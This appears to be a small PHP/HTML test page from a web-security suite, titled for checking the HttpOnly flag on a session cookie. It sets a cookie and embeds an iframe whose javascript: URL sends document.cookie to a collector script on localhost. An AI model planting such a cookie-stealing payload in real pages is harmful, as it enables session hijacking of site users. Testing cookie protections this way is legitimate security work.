<html>
<head>
<title>Vulnerable : Session Cookie HttpOnly</title>
</head>
<body>
<?php setcookie('value', 'secret_cookie', "", "", "", "", true); ?>
<iframe src="javascript:document.location='http://localhost:8089/session_mng/httponly/bad.php?cookie='+document.cookie"></iframe>
</body>
</html>
